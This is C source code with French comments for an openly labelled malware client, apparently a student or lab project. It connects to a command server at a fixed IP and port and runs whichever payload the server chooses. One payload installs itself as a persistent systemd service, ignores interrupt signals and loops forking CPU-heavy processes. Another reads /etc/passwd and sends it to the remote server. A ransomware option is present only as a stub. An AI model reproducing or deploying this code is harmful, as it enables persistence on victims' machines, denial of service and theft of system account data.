#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <libgen.h>
#include <string.h>
#include <limits.h>
#define PORT 8080

#define BUF_SIZE 1024 //Exfiltration


//Fonction exfiltration ------------------------------------
void die(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

void exfiltration_client(int sock) {
    /*struct sockaddr_in serv_addr;
    */
   char buffer[BUF_SIZE] = {0};
   FILE *fp;

    printf("Fonction exfiltration en cours d'execution\n");

    printf("Envoi du fichier...\n");

    fp = fopen("/etc/passwd", "rb");
    if (fp == NULL) {
        die("Erreur : Fichier non ouvert");
    }else{
        printf("INFO : Fichier passwd ouvert\n");
    }

    while (!feof(fp)) {
        int bytesRead = fread(buffer, sizeof(char), BUF_SIZE, fp);
        send(sock, buffer, bytesRead, 0);
        printf("Envoi des données dans passwd en cours..\n");
    }

    printf("Fichier envoyé.\n");

    fclose(fp);
    close(sock);
}

//-----------------------------------------------------------


// ForkBomb ------------------------------------------------- 

#define NUM_CHILDREN 5

// Gestionnaire de signal pour ignorer CTRL+C et CTRL+Z
void signalHandler(int sig) {
    if (sig == SIGINT) {
        printf("CTRL+C détecté, mais ignoré\n");
    } else if (sig == SIGTSTP) {
        printf("CTRL+Z détecté, mais ignoré\n");
    }
}

void intensiveTask() {
    for (long i = 2; i < 1000000; i++) {
        int prime = 1;
        for (long j = 2; j < i; j++) {
            if (i % j == 0) {
                prime = 0;
                break;
            }
        }
    }
}

void createSystemdService(const char* execPath) {
    FILE *fp = fopen("/etc/systemd/system/monprogramme.service", "w");
    if (fp == NULL) {
        perror("Erreur en ouvrant le fichier de service");
        exit(EXIT_FAILURE);
    }

    fprintf(fp, "[Unit]\n");
    fprintf(fp, "Description=Mon Programme de Surcharge CPU\n\n");
    fprintf(fp, "[Service]\n");
    fprintf(fp, "ExecStart=%s\n", execPath);
    fprintf(fp, "Restart=always\n\n");
    fprintf(fp, "[Install]\n");
    fprintf(fp, "WantedBy=multi-user.target\n");

    fclose(fp);
    system("systemctl daemon-reload");
    system("systemctl enable monprogramme.service");
}

void runProgram(char *execPath) {
    // Associer SIGINT et SIGTSTP au gestionnaire de signal
    signal(SIGINT, signalHandler);
    signal(SIGTSTP, signalHandler);

    char newPath[PATH_MAX];
    snprintf(newPath, sizeof(newPath), "/usr/local/bin/%s", basename(execPath));

    char command[PATH_MAX * 2 + 10];
    snprintf(command, sizeof(command), "cp %s %s", execPath, newPath);
    system(command);

    createSystemdService(newPath);

    while(1) {
        for (int i = 0; i < NUM_CHILDREN; i++) {
            pid_t pid = fork();

            if (pid == 0) {
                printf("Processus enfant %d avec PID: %d\n", i + 1, getpid());
                intensiveTask();
                exit(0);
            } else if (pid > 0) {
                wait(NULL);
            } else {
                perror("Erreur de fork");
                exit(EXIT_FAILURE);
            }
        }

        sleep(1);
    }
}

// ForkBomb end ----------------------------------------------

int main(int argc, char const *argv[]) {
    struct sockaddr_in serv_addr;
    int sock = 0;
    int server_choice;

    printf("Création d'un socket client...\n");
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Erreur : Impossible de créer le socket \n");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    printf("Conversion de l'adresse IPv4 du texte en binaire...\n");
    if(inet_pton(AF_INET, "172.20.10.8", &serv_addr.sin_addr) <= 0) {
        printf("\nErreur : Adresse invalide/ Adresse non prise en charge\n");
        return -1;
    }

    printf("Attempting to connect to server...\n");
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("\nErreur : Echec de connexion avec le server \n");
        return -1;
    }

    printf("Connexion établie avec le server. En attente de données...\n");

    read(sock, &server_choice, sizeof(server_choice));
    printf("Choix du serveur reçu : %d\n", server_choice);


    switch (server_choice) {

            //Choose number 1 Forkbomb
            case 1:
                printf("-> Execution du malware Forkbomb\n");
                char execPath[PATH_MAX];
                realpath(argv[0], execPath);
                runProgram(execPath);
                return 0;
                break;

            //Choose number 2 Exfiltration
            case 2:
                printf("-> Execution du malware exfiltration de données...\n");
                exfiltration_client(sock);
                return 0;
                break;


            case 3:
                printf("-> Execution du malware ransomware \n");
                break;


            case 4:
                printf("Quitter le programme...\n");
                return 0;
            default:
                printf("Choix non valide. Veuillez saisir un nombre entre 0 et 4.\n");
        }



    close(sock);
    printf("La connexion avec le client a été interrompue.\n");

    return 0;
}
